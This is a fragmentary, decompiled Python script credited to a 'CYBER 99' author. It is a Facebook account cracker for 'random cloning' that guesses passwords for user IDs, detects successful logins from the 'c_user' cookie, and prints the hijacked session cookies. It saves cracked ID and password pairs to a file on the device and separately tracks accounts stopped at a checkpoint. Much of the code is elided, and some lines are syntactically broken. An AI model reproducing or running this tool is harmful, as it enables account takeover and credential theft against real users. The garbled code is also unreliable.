# Decompile by PARVEJ HOSSEN
# Github :  ROMAN-XXX
#Facebook : FH Roman
#-------------------------------------------------------------------------------#
#Don't Forget To Follow My Github👇
# github.com/ROMAN-XXX
...
\033[0;35md8888b.  .d8b.  d8888b. db    db d88888b    d88b 
\033[0;35m88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
\033[0;32m88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
\033[0;32m88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
\033[0;36m88      88   88 88 `88.  `8bd8'  88.     db. 88  
\033[0;36m88      YP   YP 88   YD    YP    Y88888P Y8888P  
 
 ╔═════════════════[\033[1;32m 𝘼𝘿𝙈𝙄𝙉 𝙄𝙉-𝙁𝙍𝙊 \033[1;32m]══════════════╗
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m MD PARVEJ HOSSEN      \033[1;93m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m FH Roman              \033[1;93m║
 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35mROMAN-XXX            \033[1;93m ║
 \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning       \033[1;93m ║
 \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;35mCYBER 99             \033[1;93m ║
 \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.2                  \033[1;93m ║
 \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;93m║
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....                 \033[1;93m  ║
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m PARVEJ                                  \033[1;93m ║
 ╚═════════════════[\033[1;32m 𝐌𝐄-PARVEJ\033[1;32m]══════════════════╝""")
loop = 0
oks = []
cps = []
def clear():
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[PARVEJ-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/PARVEJ-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}PARVEJ{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
